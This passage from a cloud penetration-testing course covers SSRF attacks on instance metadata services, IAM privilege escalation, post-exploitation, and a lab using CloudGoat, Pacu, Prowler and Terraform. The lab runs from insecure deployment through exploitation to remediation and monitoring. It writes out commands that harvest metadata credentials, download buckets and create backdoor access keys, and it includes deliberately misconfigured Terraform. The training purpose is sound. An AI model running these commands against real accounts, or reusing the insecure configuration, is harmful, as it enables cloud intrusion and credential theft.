**GCP:** Google does not require notification or approval for penetration testing of customer-owned GCP resources. The Acceptable Use Policy applies — no testing Google infrastructure, no DDoS, no testing other customers' resources.

### 9.3 Cloud-Specific Attack Techniques

**SSRF to Metadata Service (IMDSv1):**

The classic cloud exploitation technique. Applications vulnerable to SSRF can be abused to query the instance metadata service at `169.254.169.254`, retrieving temporary IAM credentials:

```bash
# Classic SSRF exploitation chain
# Step 1: SSRF to metadata service (IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role-name

# Step 2: Retrieve temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 3: Use harvested credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # Verify assumed role

# Azure equivalent (IMDS at 169.254.169.254)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP equivalent
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**IMDSv2 mitigation:** Requires a PUT request to obtain a session token before GET requests to the metadata service. This prevents simple SSRF attacks because most SSRF vulnerabilities only support GET requests:

```bash
# IMDSv2 requires two-step token retrieval — blocks basic SSRF
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**Privilege Escalation Techniques:**

| Technique | Prerequisites | Impact |
|-----------|--------------|--------|
| `iam:CreatePolicyVersion` | Permission to create new policy versions | Attach admin policy to self |
| `iam:SetDefaultPolicyVersion` | Permission to set default version | Revert to a previous permissive policy |
| `iam:PassRole` + `lambda:CreateFunction` | Pass a high-privilege role to Lambda | Execute code as the privileged role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with a privileged instance profile | Access metadata credentials |
| `sts:AssumeRole` on overly permissive trust | Role trusts the attacker's account/principal | Cross-account lateral movement |
| `ssm:SendCommand` | Permission to send SSM commands | Remote command execution on managed instances |
| `glue:UpdateDevEndpoint` + `iam:PassRole` | Glue dev endpoint with SSH key update | SSH access with Glue service role |

### 9.4 Post-Exploitation in Cloud

After initial access and privilege escalation, cloud attackers pursue:

**Persistence:**
- Create new IAM access keys on existing users
- Attach persistent policies to existing roles
- Create Lambda functions triggered by CloudWatch Events for recurring access
- Deploy EC2 instances with reverse shells in unmonitored regions
- Add trust relationships to existing roles allowing external account access

**Data Access:**
- Enumerate and download S3 buckets containing sensitive data
- Query RDS databases using stolen credentials
- Access Secrets Manager or SSM Parameter Store for application secrets
- Export DynamoDB tables

**Lateral Movement:**
- Assume roles in other accounts via cross-account trust
- Use SSM Session Manager to pivot to other instances
- Access ECS/EKS services via task role credentials
- Abuse VPC peering to reach resources in other VPCs

### 9.5 Cloud Penetration Testing Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **Pacu** | Exploitation framework | AWS exploitation, privilege escalation, data exfiltration |
| **ScoutSuite** | Assessment | Multi-cloud security posture assessment |
| **Prowler** | Assessment | AWS/Azure/GCP compliance and security audit |
| **CloudFox** | Enumeration | Find exploitable attack paths in cloud environments |
| **Steampipe** | Query engine | SQL-based cloud resource querying |
| **enumerate-iam** | Enumeration | Brute-force enumerate IAM permissions |
| **Cloudsplaining** | Analysis | Identify overprivileged IAM policies |
| **WeirdAAL** | Exploitation | AWS attack library |
| **ROADtools** | Enumeration | Azure AD enumeration and exploitation |
| **AADInternals** | Exploitation | Azure AD and O365 exploitation toolkit |

**Pacu — AWS exploitation framework:**

```bash
# Install and launch Pacu
pip install pacu
pacu

# Inside Pacu session:
# Set stolen credentials
set_keys

# Enumerate the environment
run iam__enum_users_roles_policies_groups
run iam__enum_permissions

# Check for privilege escalation paths
run iam__privesc_scan

# Enumerate accessible data stores
run s3__enum_buckets
run s3__download_bucket --bucket target-bucket

# Enumerate Lambda functions
run lambda__enum

# Establish persistence
run iam__backdoor_users_keys --usernames admin
run iam__backdoor_assume_role
```

**ScoutSuite — multi-cloud assessment:**

```bash
# Install ScoutSuite
pip install scoutsuite

# Scan AWS account
scout aws --profile security-audit --regions eu-west-1,eu-central-1

# Scan Azure subscription
scout azure --cli

# Scan GCP project
scout gcp --project-id my-project

# Output is an interactive HTML report at:
# scoutsuite-report/scoutsuite_results_aws-*.html
```

**CloudFox — attack path enumeration:**

```bash
# Install CloudFox
go install github.com/BishopFox/cloudfox@latest

# Enumerate all attack-relevant data
cloudfox aws --profile target all-checks

# Specific checks
cloudfox aws --profile target instances         # EC2 with public IPs
cloudfox aws --profile target endpoints          # Service endpoints
cloudfox aws --profile target env-vars           # Environment variables in Lambda/ECS
cloudfox aws --profile target iam-simulator      # Permission simulation
cloudfox aws --profile target role-trusts        # Cross-account role trusts
cloudfox aws --profile target principals         # All IAM principals
```

---

## 10. Laboratorio Pratico

### 10.1 Obiettivi del Laboratorio

This lab follows a complete offensive-defensive cycle:

1. Deploy an intentionally insecure AWS environment using CloudGoat
2. Scan with Prowler and ScoutSuite to identify misconfigurations
3. Exploit as an attacker using Pacu and manual techniques
4. Remediate with Terraform and AWS Config
5. Verify compliance with Security Hub
6. Implement continuous monitoring

### 10.2 Fase 1 — Deploy dell'Ambiente Insicuro

CloudGoat by Rhino Security Labs deploys intentionally vulnerable AWS scenarios for training.

```bash
# Install CloudGoat
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip install -r ./requirements.txt
chmod +x cloudgoat.py

# Configure with your AWS profile
./cloudgoat.py config profile security-lab
./cloudgoat.py config whitelist --auto

# Deploy the iam_privesc_by_rollback scenario
# This creates an IAM user with a policy that has 5 versions,
# one of which grants full admin access
./cloudgoat.py create iam_privesc_by_rollback

# Deploy the ec2_ssrf scenario
# This creates an EC2 instance vulnerable to SSRF with access to a
# Lambda function that has access to secrets
./cloudgoat.py create ec2_ssrf

# Note the output credentials and resource IDs
```

**Alternative: Custom Terraform insecure deployment:**

```hcl
# insecure_lab/main.tf — Intentionally misconfigured resources for training
# WARNING: Deploy only in isolated lab accounts. Destroy immediately after use.

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = "eu-west-1"
}

# Misconfiguration 1: Public S3 bucket
resource "aws_s3_bucket" "public_data" {
  bucket        = "lab-insecure-public-${random_id.suffix.hex}"
  force_destroy = true
}

resource "aws_s3_bucket_ownership_controls" "public_data" {
  bucket = aws_s3_bucket.public_data.id
  rule {
    object_ownership = "BucketOwnerPreferred"
  }
}

resource "aws_s3_bucket_public_access_block" "public_data" {
  bucket                  = aws_s3_bucket.public_data.id
  block_public_acls       = false  # INSECURE
  block_public_policy     = false  # INSECURE
  ignore_public_acls      = false  # INSECURE
  restrict_public_buckets = false  # INSECURE
}

resource "aws_s3_bucket_acl" "public_data" {
  depends_on = [
    aws_s3_bucket_ownership_controls.public_data,
    aws_s3_bucket_public_access_block.public_data,
  ]
  bucket = aws_s3_bucket.public_data.id
  acl    = "public-read"  # INSECURE
}

resource "aws_s3_object" "sensitive_file" {
  bucket  = aws_s3_bucket.public_data.id
  key     = "credentials/database.conf"
  content = "db_host=prod-db.internal\ndb_user=admin\ndb_pass=SuperSecret123!"
}

# Misconfiguration 2: Overprivileged IAM role
resource "aws_iam_role" "overprivileged" {
  name = "lab-overprivileged-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action    = "sts:AssumeRole"
      Effect    = "Allow"
      Principal = { AWS = "*" }  # INSECURE: Any account can assume
    }]
  })
}

resource "aws_iam_role_policy" "admin_access" {
  name = "admin-access"
  role = aws_iam_role.overprivileged.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "*"       # INSECURE: Full admin
      Resource = "*"
    }]
  })
}

# Misconfiguration 3: EC2 with IMDSv1 and public IP
resource "aws_security_group" "wide_open" {
  name        = "lab-wide-open"
  description = "Intentionally insecure SG"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # INSECURE
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "vulnerable" {
  ami                         = data.aws_ami.amazon_linux.id
  instance_type               = "t3.micro"
  associate_public_ip_address = true  # INSECURE
  vpc_security_group_ids      = [aws_security_group.wide_open.id]
  iam_instance_profile        = aws_iam_instance_profile.overprivileged.name

  metadata_options {
    http_tokens = "optional"  # INSECURE: IMDSv1 enabled
  }

  user_data = <<-EOF
    #!/bin/bash
    yum install -y httpd
    echo "Lab Instance" > /var/www/html/index.html
    systemctl start httpd
  EOF

  tags = {
    Name = "lab-vulnerable-instance"
  }
}

resource "aws_iam_instance_profile" "overprivileged" {
  name = "lab-overprivileged-profile"
  role = aws_iam_role.overprivileged.name
}

data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["al2023-ami-*-x86_64"]
  }
}

resource "random_id" "suffix" {
  byte_length = 4
}

# Misconfiguration 4: CloudTrail not enabled (by omission)
# No CloudTrail resource = no audit trail

output "public_bucket_url" {
  value = "https://${aws_s3_bucket.public_data.bucket}.s3.amazonaws.com/"
}

output "vulnerable_instance_ip" {
  value = aws_instance.vulnerable.public_ip
}

output "overprivileged_role_arn" {
  value = aws_iam_role.overprivileged.arn
}
```

### 10.3 Fase 2 — Scan con Prowler e ScoutSuite

```bash
# Scan with Prowler — comprehensive assessment
prowler aws --profile security-lab --region eu-west-1 \
  --compliance cis_3.0_aws \
  --output-formats json-ocsf csv html \
  --output-directory /tmp/prowler-results/

# Quick severity filter — show only CRITICAL and HIGH
prowler aws --profile security-lab \
  --severity critical high \
  --output-formats csv

# Prowler output summary:
#  PASS: 145 | FAIL: 23 | MANUAL: 12
#  Critical: 5 | High: 8 | Medium: 7 | Low: 3

# Scan with ScoutSuite — interactive report
scout aws --profile security-lab --regions eu-west-1 \
  --report-dir /tmp/scoutsuite-results/

# Open the HTML report
# firefox /tmp/scoutsuite-results/scoutsuite-report/scoutsuite_results_aws-*.html

# Steampipe SQL queries for targeted investigation
steampipe query "
  SELECT
    name,
    region,
    bucket_policy_is_public,
    block_public_acls,
    block_public_policy,
    server_side_encryption_configuration
  FROM
    aws_s3_bucket
  WHERE
    bucket_policy_is_public = true
    OR block_public_acls = false
  ORDER BY
    name;
"
```

### 10.4 Fase 3 — Exploitation con Pacu

```bash
# Start Pacu with harvested credentials from SSRF or exposed keys
pacu

# Set credentials obtained from the vulnerable environment
Pacu> set_keys
  Key alias: lab-target
  Access Key ID: AKIA...
  Secret Access Key: ...

# Reconnaissance
Pacu> run iam__enum_users_roles_policies_groups
# Output: Found 5 users, 8 roles, 12 policies

Pacu> run iam__enum_permissions
# Output: Current user has iam:SetDefaultPolicyVersion

# Privilege escalation via policy version rollback
# (CloudGoat iam_privesc_by_rollback scenario)
Pacu> run iam__privesc_scan
# Output: POTENTIAL PRIVESC: SetExistingDefaultPolicyVersion
#         User can set default policy version to v1 which grants *:*

# Execute the privilege escalation
Pacu> run iam__privesc_scan --method SetExistingDefaultPolicyVersion

# Verify escalation
Pacu> run iam__enum_permissions
# Output: User now has AdministratorAccess (via policy version v1)

# Data exfiltration
Pacu> run s3__enum_buckets
# Output: Found bucket lab-insecure-public-a1b2c3d4

Pacu> run s3__download_bucket --bucket lab-insecure-public-a1b2c3d4
# Output: Downloaded credentials/database.conf

# Establish persistence
Pacu> run iam__backdoor_users_keys --usernames target-user
# Output: Created new access key for target-user
```

### 10.5 Fase 4 — Remediation con Terraform e AWS Config

```hcl
# remediated/main.tf — Secure version of the lab infrastructure

# Remediation 1: Secure S3 bucket
resource "aws_s3_bucket" "secure_data" {
  bucket        = "lab-secure-data-${random_id.suffix.hex}"
  force_destroy = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "secure_data" {
  bucket = aws_s3_bucket.secure_data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "secure_data" {
  bucket                  = aws_s3_bucket.secure_data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_versioning" "secure_data" {
  bucket = aws_s3_bucket.secure_data.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_logging" "secure_data" {
  bucket        = aws_s3_bucket.secure_data.id
  target_bucket = aws_s3_bucket.access_logs.id
  target_prefix = "s3-logs/"
}

# Remediation 2: Least-privilege IAM role
resource "aws_iam_role" "least_privilege" {
  name = "lab-least-privilege-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action    = "sts:AssumeRole"
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Condition = {
        StringEquals = {
          "aws:SourceAccount" = data.aws_caller_identity.current.account_id
        }
      }
    }]
  })
}

resource "aws_iam_role_policy" "minimal_access" {
  name = "minimal-access"
  role = aws_iam_role.least_privilege.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid      = "ReadOwnBucket"
        Effect   = "Allow"
        Action   = ["s3:GetObject", "s3:ListBucket"]
        Resource = [
          aws_s3_bucket.secure_data.arn,
          "${aws_s3_bucket.secure_data.arn}/*"
        ]
      },
      {
        Sid      = "WriteCloudWatchLogs"
        Effect   = "Allow"
        Action   = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents"
        ]
        Resource = "arn:aws:logs:eu-west-1:${data.aws_caller_identity.current.account_id}:*"
      }
    ]
  })
}

# Remediation 3: Hardened EC2 with IMDSv2
resource "aws_security_group" "hardened" {
  name        = "lab-hardened"
  description = "Restricted security group"

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = [var.admin_cidr]  # Specific IP range only
  }

  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "hardened" {
  ami                         = data.aws_ami.amazon_linux.id
  instance_type               = "t3.micro"
  associate_public_ip_address = false  # No public IP
  subnet_id                   = var.private_subnet_id
  vpc_security_group_ids      = [aws_security_group.hardened.id]
  iam_instance_profile        = aws_iam_instance_profile.least_privilege.name

  metadata_options {
    http_tokens                 = "required"    # IMDSv2 only
    http_put_response_hop_limit = 1             # Prevent container SSRF relay
    http_endpoint               = "enabled"
    instance_metadata_tags      = "disabled"
  }

  root_block_device {
    encrypted   = true
    volume_type = "gp3"
  }

  monitoring = true  # Detailed CloudWatch monitoring

  tags = {
    Name = "lab-hardened-instance"
  }
}

resource "aws_iam_instance_profile" "least_privilege" {
  name = "lab-least-privilege-profile"
  role = aws_iam_role.least_privilege.name
}

# Remediation 4: Enable CloudTrail
resource "aws_cloudtrail" "main" {
  name                          = "lab-security-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail_logs.id
  include_global_service_events = true
  is_multi_region_trail         = true
  enable_log_file_validation    = true
  kms_key_id                    = aws_kms_key.cloudtrail.arn

  event_selector {
    read_write_type           = "All"
    include_management_events = true
    data_resource {
      type   = "AWS::S3::Object"
      values = ["arn:aws:s3"]
    }
  }
}

data "aws_caller_identity" "current" {}

# Deploy AWS Config rules for continuous monitoring
resource "aws_config_config_rule" "s3_public_read" {
  name = "s3-bucket-public-read-prohibited"
  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
  depends_on = [aws_config_configuration_recorder.main]
}

resource "aws_config_config_rule" "restricted_ssh" {
  name = "restricted-ssh"
  source {
    owner             = "AWS"
    source_identifier = "INCOMING_SSH_DISABLED"
  }
  depends_on = [aws_config_configuration_recorder.main]
}

resource "aws_config_config_rule" "encrypted_volumes" {
  name = "encrypted-volumes"
  source {
    owner             = "AWS"
    source_identifier = "ENCRYPTED_VOLUMES"
  }
  depends_on = [aws_config_configuration_recorder.main]
}

resource "aws_config_config_rule" "iam_root_key" {
  name = "iam-root-access-key-check"
  source {
    owner             = "AWS"
    source_identifier = "IAM_ROOT_ACCESS_KEY_CHECK"
  }
  depends_on = [aws_config_configuration_recorder.main]
}

resource "aws_config_configuration_recorder" "main" {
  name     = "default"
  role_arn = aws_iam_role.config.arn
  recording_group {
    all_supported                 = true
    include_global_resource_types = true
  }
}
```

### 10.6 Fase 5 — Verifica Compliance con Security Hub

```bash
# Enable Security Hub
aws securityhub enable-security-hub \
  --enable-default-standards \
  --control-finding-generator SECURITY_CONTROL

# Wait for initial assessment (30-60 minutes for full evaluation)

# Check overall compliance
aws securityhub get-finding-aggregator \
  --finding-aggregator-arn "arn:aws:securityhub:eu-west-1:ACCOUNT:finding-aggregator/default" 2>/dev/null || true

# List all failed checks
aws securityhub get-findings \
  --filters '{
    "ComplianceStatus": [{"Value": "FAILED", "Comparison": "EQUALS"}],
    "RecordState": [{"Value": "ACTIVE", "Comparison": "EQUALS"}],
    "WorkflowStatus": [{"Value": "NEW", "Comparison": "EQUALS"}]
  }' \
  --sort-criteria '{"Field": "SeverityLabel", "SortOrder": "desc"}' \
  --max-items 20 \
  --query 'Findings[].{Title:Title, Severity:Severity.Label, Resource:Resources[0].Id, Status:Compliance.Status}'

# Compare before/after remediation
# Before: FAIL count from Prowler scan
# After: Re-run Prowler
prowler aws --profile security-lab --region eu-west-1 \
  --compliance cis_3.0_aws \
  --output-formats json-ocsf \
  --output-directory /tmp/prowler-post-remediation/

# Diff reports
python3 -c "
import json, sys

with open('/tmp/prowler-results/output.json') as f:
    before = json.load(f)
with open('/tmp/prowler-post-remediation/output.json') as f:
    after = json.load(f)

before_fails = sum(1 for r in before if r.get('status') == 'FAIL')
after_fails = sum(1 for r in after if r.get('status') == 'FAIL')
print(f'Before remediation: {before_fails} failures')
print(f'After remediation:  {after_fails} failures')
print(f'Remediated:         {before_fails - after_fails} findings')
"
```

### 10.7 Fase 6 — Continuous Monitoring Implementation

```python
# continuous_monitor.py — EventBridge + Lambda for real-time CSPM
import boto3
import json

def deploy_monitoring_stack():
    """Deploy EventBridge rules that trigger on security-relevant events."""
    events = boto3.client('events')
    lambda_client = boto3.client('lambda')

    # Rule 1: Detect public S3 bucket creation
    events.put_rule(
        Name='detect-public-s3',
        Description='Triggers when S3 bucket ACL or policy changes',
        EventPattern=json.dumps({
            "source": ["aws.s3"],
            "detail-type": ["AWS API Call via CloudTrail"],
            "detail": {
                "eventName": [
                    "PutBucketAcl",
                    "PutBucketPolicy",
                    "DeleteBucketPublicAccessBlock",
                    "PutBucketPublicAccessBlock"
                ]
            }
        }),
        State='ENABLED'
    )

    # Rule 2: Detect IAM policy changes
    events.put_rule(
        Name='detect-iam-changes',
        Description='Triggers on IAM policy creation or modification',
        EventPattern=json.dumps({
            "source": ["aws.iam"],
            "detail-type": ["AWS API Call via CloudTrail"],
            "detail": {
                "eventName": [
                    "CreatePolicy",
                    "CreatePolicyVersion",
                    "SetDefaultPolicyVersion",
                    "AttachUserPolicy",
                    "AttachRolePolicy",
                    "PutUserPolicy",
                    "PutRolePolicy",
                    "CreateAccessKey",
                    "UpdateAssumeRolePolicy"
                ]
            }
        }),
        State='ENABLED'
    )

    # Rule 3: Detect security group changes
    events.put_rule(
        Name='detect-sg-changes',
        Description='Triggers on security group modification',
        EventPattern=json.dumps({
            "source": ["aws.ec2"],
            "detail-type": ["AWS API Call via CloudTrail"],
            "detail": {
                "eventName": [
                    "AuthorizeSecurityGroupIngress",
                    "AuthorizeSecurityGroupEgress",
                    "RevokeSecurityGroupIngress",
                    "RevokeSecurityGroupEgress",
                    "CreateSecurityGroup"
                ]
            }
        }),
        State='ENABLED'
    )

    # Rule 4: Detect CloudTrail tampering
    events.put_rule(
        Name='detect-cloudtrail-tampering',
        Description='CRITICAL: Triggers if CloudTrail is modified or disabled',
        EventPattern=json.dumps({
            "source": ["aws.cloudtrail"],
            "detail-type": ["AWS API Call via CloudTrail"],
            "detail": {
                "eventName": [
                    "StopLogging",
                    "DeleteTrail",
                    "UpdateTrail",
                    "PutEventSelectors"
                ]
            }
        }),
        State='ENABLED'
    )

    print("Monitoring rules deployed successfully.")
    print("Rules: detect-public-s3, detect-iam-changes, detect-sg-changes, detect-cloudtrail-tampering")
    print("Connect Lambda targets to each rule for automated response.")


def security_event_handler(event, context):
    """Lambda handler for security events — evaluates and responds."""
    source = event.get('source', '')
    detail = event.get('detail', {})
    event_name = detail.get('eventName', '')
    user_identity = detail.get('userIdentity', {})
    principal = user_identity.get('arn', 'unknown')

    severity = 'HIGH'
    if event_name in ('StopLogging', 'DeleteTrail'):
        severity = 'CRITICAL'
    elif event_name in ('CreateAccessKey', 'PutUserPolicy'):
        severity = 'HIGH'

    finding = {
        'severity': severity,
        'event': event_name,
        'principal': principal,
        'source_ip': detail.get('sourceIPAddress', 'unknown'),
        'region': detail.get('awsRegion', 'unknown'),
        'timestamp': detail.get('eventTime', 'unknown'),
        'raw_event': detail
    }

    # Log to CloudWatch for SIEM ingestion
    print(json.dumps({
        'alert_type': 'CSPM_REALTIME',
        'finding': finding
    }))

    # Auto-remediate critical events
    if severity == 'CRITICAL' and event_name == 'StopLogging':
        cloudtrail = boto3.client('cloudtrail')
        trail_name = detail.get('requestParameters', {}).get('name', '')
        if trail_name:
            cloudtrail.start_logging(Name=trail_name)
            print(f"AUTO-REMEDIATED: Re-enabled logging on trail {trail_name}")

    # Send SNS notification for all HIGH+ findings
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:eu-west-1:ACCOUNT_ID:security-alerts',
        Subject=f'[{severity}] Cloud Security Alert: {event_name}',
        Message=json.dumps(finding, indent=2, default=str)
    )

    return {'statusCode': 200}


if __name__ == '__main__':
    deploy_monitoring_stack()
```

### 10.8 Cleanup

```bash
# Destroy CloudGoat scenarios
cd cloudgoat
./cloudgoat.py destroy iam_privesc_by_rollback
./cloudgoat.py destroy ec2_ssrf

# Destroy custom Terraform lab
cd insecure_lab
terraform destroy -auto-approve

# Destroy remediated stack
cd remediated
terraform destroy -auto-approve

# Verify no resources remain
aws resourcegroupstaggingapi get-resources \
  --tag-filters "Key=Name,Values=lab-*" \
  --query 'ResourceTagMappingList[].ResourceARN'

# Delete Prowler/ScoutSuite reports
rm -rf /tmp/prowler-results/ /tmp/prowler-post-remediation/ /tmp/scoutsuite-results/
```

---

## Riferimenti e Risorse

| Risorsa | URL / Identificativo |
|---------|---------------------|
| NIST SP 800-53 Rev. 5 | csrc.nist.gov/publications/detail/sp/800-53/rev-5/final |
| CIS AWS Foundations Benchmark v3.0 | cisecurity.org/benchmark/amazon_web_services |
| CIS Azure Foundations Benchmark v2.1 | cisecurity.org/benchmark/azure |
| CIS GCP Foundations Benchmark v2.0 | cisecurity.org/benchmark/google_cloud_computing_platform |
| AWS Shared Responsibility Model | aws.amazon.com/compliance/shared-responsibility-model/ |
| Azure Shared Responsibility | learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility |
| GCP Shared Responsibility | cloud.google.com/architecture/framework/security |
| Prowler | github.com/prowler-cloud/prowler |
| ScoutSuite | github.com/nccgroup/ScoutSuite |
| Pacu | github.com/RhinoSecurityLabs/pacu |
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat |
| CloudFox | github.com/BishopFox/CloudFox |
| Checkov | github.com/bridgecrewio/checkov |
| Open Policy Agent | openpolicyagent.org |
| Steampipe | steampipe.io |
| OCSF (Open Cybersecurity Schema Framework) | ocsf.io |
| Gartner CNAPP Market Guide | gartner.com/reviews/market/cloud-native-application-protection-platforms |
